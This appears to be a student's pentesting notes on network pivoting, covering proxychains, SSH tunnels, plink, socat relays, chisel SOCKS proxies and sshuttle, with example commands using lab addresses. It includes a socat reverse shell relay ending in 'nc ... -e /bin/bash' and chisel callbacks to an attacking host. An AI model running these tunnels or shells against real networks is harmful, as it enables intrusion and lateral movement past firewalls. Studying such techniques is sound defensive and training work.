---
layout: default
---
# Pivoting

Pivoting is the art of using access obtained over one machine to exploit another machine deeper in to the network

Two Main method to do pivioting ;:
→ Tunneling/proxying → creating a proxy type connection through a compromised machine in order to route all desired traffic in to the targeted system.This could also be tunnelled inside another protocole (eg SSH tunnelling), which can be useful to evade basic IDS or firewall.
→ Port Forwarding → Creating a connection between a local port and single port on a target via compromised host.

Proxy is good if we want to redirect lots of different kind of traffic into our target network (example nmap scan)
Port forwading is faster and reliable but only allows us to access single port on a target device

## ProxyChains,FoxyProxy

In /etc/proxychains.conf comment out the proxy_dns line which can cause a scan to hang and ultimately crash
→ We can only use TCP scans -- so no UDP or SYN scans. ICMP echo packets will also not work through the proxy, so use -Pn switch
→ It will be extremely slow. 

## SSH Tunneling

Forward Connections → It is done when we have ssh access to the target

There are two ways to do it ::
1) → Port Forwading → it is done using -L switch which creates a link to a local port.
```
Example :: 
ssh access server → 172.16.0.5
web server running → 172.16.0.10
Command → ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
-fN → backgrounds the shell so that we have our terminal back and N tells that it does not need to execute any commands only set up connection.
```
We could then access the website on 172.16.0.10 (through 172.16.0.5) by navigating to port 8000 on our own attacking machine (localhost:8000).

2) → Proxies → Proxies are made using the -D switch 
```
Example :: 
-D 1337 → This will open up port 1337 on our attacking box as a proxy to send data through in to the protected network.Useful when combined with proxychains
Command → ssh -D 1337 user@172.16.0.5 -fN
```
Reverse Connection → Risky do not do it

## Plink.exe

It is a windows command line version of the PUTTY ssh client . Now windows comes with its own ssh client.

Syntax of command → cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
cmd.exe /c echo y → is for non-interactive shells (like mose reverse-shells).

```
Example ::
we have  access → 172.16.0.5
web server running → 172.16.0.10
command → cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE (id_rsa) -N
```
Note → any keys generated with ssh-keygen will not work here we need to convert them using puttygen tool
command → puttygen KEYFILE -o OUTPUT_KEY.ppk

## SOCAT
### Reverse shell Relay ::

On our attacking box     → nc -lvnp 443
On compromised server → ./socat tcp-l:8000 tcp:attacking-ip:443 & 
```
Example :: 
[root@prod-server]# ./socat tcp-l:8000 tcp:10.50.73.2:443 & → listen on  8000 and send traffic to attacker 443
[root@prod-server]# chmod +x ./nc
[root@prod-server]# ./nc 127.0.0.1 8000 -e /bin/bash → here we connect to the server 8000 which will direct it to attacker 443
````
### Forwarding PORT NOISY:: 
compromised server → 172.16.0.5
target server and port → 172.16.0.10:3306
```
command → ./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
```
This opens up a port 33060 in compromised server and redirects the input from the attacking machine straight to the intended target server giving us access to the port 3306 (maybe MYSQL) running on th target.
fork → fork in used to put every connection in to the new process
reuseaddr → means that the port stays open after the connection is made to it.

### Forwarding Port Quiet ::
Previous techinque opens up a port in compromised server which can be noisy and detectable
``
Attacking machine → socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```
open up two port 8001 and 8000 creating a local port relay what goes in to one comes out into another. For this reason port 8000 has fork and reuseaddr to create more than one connection using the port forward
```
Compromised relay server (172.16.0.5) → ./socat tcp:Attacking_ip:8001 tcp:TARGET_IP(172.16.0.10):TARGET_PORT(80),fork &
```
this makes connection between our listening port 8001 on the attacking machine and open port of the target server.
we could go localhost:8000 in our attacking machine web browser to load the webpage served by the target (172.16.0.10:80)

What happens when we access the webpage in browser ::
1) → The request goes to 127.0.0.1:8000
2) → Due to socat listening on it anything goes in to 8000 comes out of port 8001
3) → Port 8001 is connected to socat process of the compromised server where it gets relayed to the port 80 of the target server

When target sends response :::
1) the response is sent to the socat process on the compromised server.What goes in to the process comes out at the other side, which happens to link straight to port 8001 on our attacking machine
2) Anything that goes in to port 8001 of out attacking machine comes out of 8000 on our attacking machine, which is where the webbrowser is expecting to receive the response.

TO close ::
1) jobs
2) kill %1

## CHISEL
It is a tool used to set up tunneling proxy or port forward through a compromised system regardless of whether we have ssh access or not.
It has two modules ;:
server
client

### Reverse SOCKS Proxy ::
This connects back from a compromised server to a listener waiting on our attacking machine.
```
Attacking box → ./chisel server -p LISTEN_PORT --reverse &
THis sets up listener on our chosen port

Compromised Server → ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
THis command connects back to the waiting listener on our attacking box ,completing the proxy. 
```
### Forward SOCKS PROXY ::
Rarer then reverse proxies same as reverse shell common than bind shell
```
Compromised host → ./chisel server -p LISTEN_PORT --socks5
Attaking host →  ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
PROXY_PORT will be the port that will be opened for the proxy
```
> we need to edit /etc/proxychains.conf file → socks 127.0.0.1 1080

### Remote Port Forward ::
A remote port forward is when we connect back from a compromised target to create the forward
```
Attacking Machine → ./chisel server -p LISTEN_PORT --reverse &
Compromised Mac → ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
LISTEN_PORT → the port we started the chisel server on
LOCAL_PORT → the port we wish to open on our attacking machine to link with the desired target port
``` 
```
Compro server → ./chisel_client 172.16.0.20:1337(our IP) R:2222:172.16.0.10:22(target_ip) &
Attack machine → ./chisel_server -p 1337 --reverse &
This would allow us to access 172.16.0.22 by navigating to 127.0.0.1:2222
```
### Local Port Forward:: 
It is where we connect from our own attacking machine to a chisel server listening on a compromised target.
```
Compromised target → ./chisel server -p LISTEN_PORT 
attacking box → ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
```
## SSHUTTLE 
It uses ssh connection to create a tunnelled proxy that acts like a new interface.It allows use to route our traffic through proxy without proxychains.

cons::
1) it only works on linux targets
2) it requires access to the compromised server via ssh also python also needs to be installed on the server.

```
use → sshuttle -r user@address subnet
example → sshuttle -r user@172.16.0.5(comp host) 172.16.0.0/24

we can also use -N rather than specifying subnet to determine them automatically based on the compromised server own's routing table
example → sshuttle -r username@address -N → may not always be successful

Using Private Key file ::
use → sshuttle -r user@address --ssh-cmd “ssh -i KEYFILE” subnet
example → sshuttle -r user@172.16.0.5 --ssh-cmd “ssh -i private_key" 172.16.0.0/24

When encountering "client: fatal: server died with error code 255" error ::
use → sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5
-x → to exclude
```

